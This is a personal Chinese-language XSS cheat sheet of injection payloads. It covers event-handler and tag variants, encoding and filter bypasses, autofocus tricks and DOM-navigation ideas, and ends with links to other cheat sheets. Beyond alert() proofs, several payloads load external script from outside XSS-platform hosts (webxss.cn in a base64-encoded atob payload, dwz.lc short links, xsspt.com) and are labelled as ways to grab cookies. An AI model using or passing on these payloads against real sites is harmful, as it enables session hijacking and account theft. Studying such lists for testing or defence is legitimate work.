# xss速查表，自己整理

- 基础

```xss
alert(document.cookie)
onclick=eval('<script>alert(/martinzhou/)</script>')
<sCrIpT>alert(123)</sCrIpT>
<img src=a onerror=alert(1)>
<svg/onload=alert(1)>
<script>prompt(1);</script>
<script>confirm      (1);</script>
<M/onclick="alert(1)">M


短payload
<svg/onload=alert(1)>
不通用
<q/oncut=open()>
<q/oncut=alert(1)> //      Useful in-case of payload restrictions.

src属性
<img src=x      onerror=prompt(1);>
<img/src=aaa.jpg      onerror=prompt(1);
<video src=x      onerror=prompt(1);>
<audio src=x      onerror=prompt(1);>

Action属性
<form action="Javascript:alert(1)"><input type=submit>
<isindex action="javascript:alert(1)" type=image>
<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
<isindex action=data:text/html, type=image>

mario验证
<formaction=&#039;data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt&#039;><button>CLICK

Expression 属性
<img style="xss:expression(alert(0))"> // Works upto IE7.
<div style="color:rgb(&#039;&#039;x:expression(alert(1))"></div>      // Works upto IE7.
<style>#test{x:expression(alert(/XSS/))}</style>      // Works upto IE7

location属性
<a onmouseover=location=’javascript:alert(1)>onclick
<body onfocus="location=&#039;javascrpt:alert(1) >123

iframe属性
<iframe style="display:none" src="data:text/html,<script>alert(/wooyun/)</script>"></iframe>
<iframesrc="javascript:alert(2)">
不通用，用时候自己修改
<iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">

img打码，最好把atob中的baes64解密换成自己的
<img src=x onerror=eval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8vd2VieHNzLmNuL1dXdWhGVj8xNDU0MTU4MzIzJw=='))>

在个人信息处，有俩个以上的input的时候，插入俩段
啊<script>alert(/*
啊">*/1)</script>


非常规事件监听
";document.body.addEventListener("DOMActivate",alert(1))//
";document.body.addEventListener("DOMActivate",prompt(1))//
";document.body.addEventListener("DOMActivate",confirm(1))//

JavaScript变形
<a href=javascript&#058;alert(1)>asd</a>
<a href=javascript&colon;alert(1)>asd</a>
<a href=JaVaScRipT:alert(1)>asd</a>
<a href=javas&Tab;cript:\u0061lert(1);>asd</a>
<a href=javascript:\u0061lert&#x28;1&#x29>asd</a>
<a href=javascript&#x3A;alert&lpar;document&period;cookie&rpar; >asd</a>
不通用
<IMG SRC="/JaVaScRiPt.:alert(&quot;XSS&quot;);">
<IMG SRC="jav&#x09;ascript.:alert('XSS');">
<IMG SRC="jav&#x0A;ascript.:alert('XSS');">
<IMG SRC="jav&#x0D;ascript.:alert('XSS');">
<IMG src="/java"\0script.:alert(\"XSS\")>";'>
```

- 过滤编码

```xss
把括号 () 给过滤了
javascript:alert\x281\x29                       # 没使用成功
<a href=javascript:alert%281%29>asd</a>
<a href=javascript:alert&#40;1&#41;>asd</a>     # '()' html 编码
<script>alert&#40/1/&#41</script>               # '()' html 编码
<body/onload=javascript:window.onerror=eval;throw&#039;=alert\x281\x29&#039;;></body>
<img src=x onerror="javascript:window.onerror=alert;throw body">

把'"过滤的绕过
<a href=javascript:alert(&quot;XSS&quot;)>asd</a>   # " html实体编码
<a href=javascript:alert(&#39;XSS&#39;)>asd</a>     # ' html实体编码

把<> 过滤的：
&lt;script&gt;alert(1)&lt;/script&gt;               # ' html实体编码

编码：
<script src="  ==  &#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#115;&#114;&#99;&#61;&#34;
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

- js输入框，获取焦点事件，自动获取焦点，执行js

```xss
<input type="text" sss="javasCript:alert%281%29" autofocus onfocus="location=this.sss" xx id="">
<!-- 引入外部的xss，打cookie -->
<input type="xxxxxxxxxx" sss='javasCript:s=document.createElement%28"sCript"%29;s.src="https://dwz.lc/uzJdazvALj";document.body.appendChild%28s%29' autofocus onfocus=location=this.sss xx>
<!-- 直接value调value -->
<input type="text" name="address" size="40" value="javasCript:alert(document.cookie)" autofocus onfocus="location=this.value"">
<input type="xxxxxxxxxx" value="javasCript:s=document.createElement%28'sCript'%29;s.src='https://dwz.lc/qkYriJkkri';document.body.appendChild%28s%29" autofocus onfocus="location=this.value" xx>
```

- xss 思路：

```xss
1、this.parentNode 会获取到这个插入点的父节点（也就是tr标签里面的节点），然后在children[8]就是获取这个节点的第9个元素，然后再innerText就可以获取到这个元素的文本部分的内容了。然后标题文本位置写入javascript:alert(1) 这样就可以构造成功一个XSS了
<img onfocus=location=this.parentNode.children[8].innerText//>

如果不能用中括号[]，就可以用firstElementChild 和 nextElementSibling组合，或者lastElementChild 和 previousElementSibling 组合来定位到自己想获取的那个元素了。
firstElementChild 第一个子元素节点
lastElementChild 最后一个子元素节点
nextElementSibling 下一个兄弟元素节点
previousElementSibling 前一个兄弟元素节点
<img onfocus=location=this.parentNode.lastElementChild.previousElementSibling.previousElementSibling.innerText//>

2、 url是http://xxxxx/177/main#mailList_1，那么也就是说，只要给这里代码在加入个 id=mailList_1 那么就可以自动触发了
<br>&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#115;&#114;&#99;&#61;&#34;http://xsspt.com/vPrzHI&#34;
```

[Portswigger公司的Web安全学院于2019年定期更新的xss备忘录](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[跨站脚本（XSS）备忘录-2019版](https://mp.weixin.qq.com/s/Q9Vjcj4W8F0ZQQi6P7djWA)

[XSS测试备忘录](https://momomoxiaoxi.com/2017/10/10/XSS/)